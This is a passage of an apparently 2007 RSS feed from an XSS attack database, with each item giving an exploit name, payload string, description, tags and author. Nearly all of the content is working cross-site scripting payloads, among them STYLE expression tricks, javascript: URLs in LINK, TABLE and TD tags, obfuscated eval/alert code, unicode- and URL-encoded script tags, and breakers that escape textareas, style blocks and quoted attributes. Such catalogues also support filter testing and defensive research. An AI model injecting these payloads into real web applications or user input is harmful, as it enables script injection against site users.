&lt;/b&gt;STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:20:20 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).</ddb:exploitDescription>      <ddb:exploitName>STYLE w/broken up JavaScript</ddb:exploitName>      <ddb:exploitString>&lt;STYLE&gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&lt;/STYLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection, internet explorer</ddb:exploitTags>    </item>    <item>      <title>STYLE w/Comment</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1901</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;STYLE w/Comment&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags, style injection, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 11:20:29 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>STYLE attribute using a comment to break up expression (Thanks to Roman Ivanov http://www.pixel-apes.com/ for this one)</ddb:exploitDescription>      <ddb:exploitName>STYLE w/Comment</ddb:exploitName>      <ddb:exploitString>&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags, style injection, internet explorer</ddb:exploitTags>    </item>    <item>      <title>Stylesheet</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1905</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Stylesheet&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Stylesheet&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:46:50 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Stylesheet</ddb:exploitDescription>      <ddb:exploitName>Stylesheet</ddb:exploitName>      <ddb:exploitString>&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Style-breaker using obfuscated JavaScript</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1830</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Style-breaker using obfuscated JavaScript&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector ends styleblocks and uses obfuscated JavaScript to create an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, CSS breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector ends styleblocks and uses obfuscated JavaScript to create an alert.</ddb:exploitDescription>      <ddb:exploitName>Style-breaker using obfuscated JavaScript</ddb:exploitName>      <ddb:exploitString>}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking, CSS breaking</ddb:exploitTags>    </item>    <item>      <title>Super basic HTML breaker 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2035</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Super basic HTML breaker 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&gt;&quot;'&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This super basic vector breaks HTML attributes&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, super short, html breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Thu, 02 Aug 07 05:26:02 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This super basic vector breaks HTML attributes&#13;&#10;</ddb:exploitDescription>      <ddb:exploitName>Super basic HTML breaker 2</ddb:exploitName>      <ddb:exploitString>&gt;&quot;'</ddb:exploitString>      <ddb:exploitTags>general, basic, super short, html breaking</ddb:exploitTags>    </item>    <item>      <title>Super short XSS variant 1</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1846</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Super short XSS variant 1&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;a=alert&lt;br&gt;a(0)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This extremely short XSS vector works only when newlines can be injected.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, super short&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This extremely short XSS vector works only when newlines can be injected.</ddb:exploitDescription>      <ddb:exploitName>Super short XSS variant 1</ddb:exploitName>      <ddb:exploitString>a=alert&#13;&#13;a(0)</ddb:exploitString>      <ddb:exploitTags>general, super short</ddb:exploitTags>    </item>    <item>      <title>Super short XSS variant 2</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2650</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Super short XSS variant 2&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;A=alert;A(1)&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This extremely short XSS vector works with out the need for newlines to be injected,&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;super short, general, basic&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;-unknown-</description>      <pubDate>Tue, 14 Aug 07 05:53:40 -0400</pubDate>      <ddb:authorName>-unknown-</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This extremely short XSS vector works with out the need for newlines to be injected,</ddb:exploitDescription>      <ddb:exploitName>Super short XSS variant 2</ddb:exploitName>      <ddb:exploitString>A=alert;A(1)</ddb:exploitString>      <ddb:exploitTags>super short, general, basic</ddb:exploitTags>    </item>    <item>      <title>TABLE</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1910</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;TABLE&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;&lt;/TABLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;Table background (who would have thought tables were XSS targets... except me, of course).&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:47:05 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>Table background (who would have thought tables were XSS targets... except me, of course).</ddb:exploitDescription>      <ddb:exploitName>TABLE</ddb:exploitName>      <ddb:exploitString>&lt;TABLE BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;&lt;/TABLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>TD</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1911</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;TD&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;TD background.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;ha.ckers.org</description>      <pubDate>Sun, 22 Jul 07 10:47:16 -0400</pubDate>      <ddb:authorName>ha.ckers.org</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>TD background.</ddb:exploitDescription>      <ddb:exploitName>TD</ddb:exploitName>      <ddb:exploitString>&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert('XSS')&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;</ddb:exploitString>      <ddb:exploitTags>general, evil tags</ddb:exploitTags>    </item>    <item>      <title>Textarea-breaker with mouseover</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1821</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Textarea-breaker with mouseover&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&lt;/textarea&gt;&lt;br&gt;&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;MOVE MOUSE OVER THIS AREA&lt;/code&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks textareas and creates an element reacting on mouveover events.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, html breaking, obfuscated, user interaction&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;kishor</description>      <pubDate>Sun, 22 Jul 07 09:37:46 -0400</pubDate>      <ddb:authorName>kishor</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks textareas and creates an element reacting on mouveover events.</ddb:exploitDescription>      <ddb:exploitName>Textarea-breaker with mouseover</ddb:exploitName>      <ddb:exploitString>&lt;/textarea&gt;&lt;br&gt;&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;MOVE MOUSE OVER THIS AREA&lt;/code&gt;</ddb:exploitString>      <ddb:exploitTags>general, html breaking, obfuscated, user interaction</ddb:exploitTags>    </item>    <item>      <title>Unicode encoded script tags</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2026</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;Unicode encoded script tags&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector uses unicode encoded codepoints to create a script tag producing an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, obfuscated, evil tags&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:04:07 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector uses unicode encoded codepoints to create a script tag producing an alert.</ddb:exploitDescription>      <ddb:exploitName>Unicode encoded script tags</ddb:exploitName>      <ddb:exploitString>'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'</ddb:exploitString>      <ddb:exploitTags>general, basic, obfuscated, evil tags</ddb:exploitTags>    </item>    <item>      <title>URL breaker for double quotes</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1990</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;URL breaker for double quotes&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;http://aa&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks double quoted URL input&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;URL breaking, general, basic, html breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 15:34:42 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks double quoted URL input</ddb:exploitDescription>      <ddb:exploitName>URL breaker for double quotes</ddb:exploitName>      <ddb:exploitString>http://aa&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>URL breaking, general, basic, html breaking</ddb:exploitTags>    </item>    <item>      <title>URL breaker for single quotes</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=1991</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;URL breaker for single quotes&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;http://aa'&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector breaks single quoted URL input&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;URL breaking, basic, general, html breaking&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;.mario</description>      <pubDate>Sun, 22 Jul 07 15:34:35 -0400</pubDate>      <ddb:authorName>.mario</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector breaks single quoted URL input</ddb:exploitDescription>      <ddb:exploitName>URL breaker for single quotes</ddb:exploitName>      <ddb:exploitString>http://aa'&gt;&lt;script&gt;alert(123)&lt;/script&gt;</ddb:exploitString>      <ddb:exploitTags>URL breaking, basic, general, html breaking</ddb:exploitTags>    </item>    <item>      <title>URL encoded image source</title>      <link>http://xssdb.dabbledb.com/dabble/attackdb?view=13110&amp;entry=2025</link>      <description>&lt;b&gt;Exploit Name: &lt;/b&gt;URL encoded image source&lt;br&gt;&lt;b&gt;Exploit String: &lt;/b&gt;&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;&lt;br&gt;&lt;b&gt;Exploit Description: &lt;/b&gt;This vector utilizes an urlencoded JS image source to create an alert.&lt;br&gt;&lt;b&gt;Exploit Tags: &lt;/b&gt;general, basic, obfuscated, internet explorer&lt;br&gt;&lt;b&gt;Author Name: &lt;/b&gt;OWASP</description>      <pubDate>Thu, 02 Aug 07 05:01:30 -0400</pubDate>      <ddb:authorName>OWASP</ddb:authorName>      <ddb:authorUrl></ddb:authorUrl>      <ddb:exploitDescription>This vector utilizes an urlencoded JS image source to create an alert.</ddb:exploitDescription>      <ddb:exploitName>URL encoded image source</ddb:exploitName>      <ddb:exploitString>&gt;%22%27&gt;&lt;img%20src%3d%22javascript:alert(%27%20XSS%27)%22&gt;</ddb:exploitString>      <ddb:exploitTags>general, basic, obfuscated, internet explorer</ddb:exploitTags>    </item>  </channel></rss>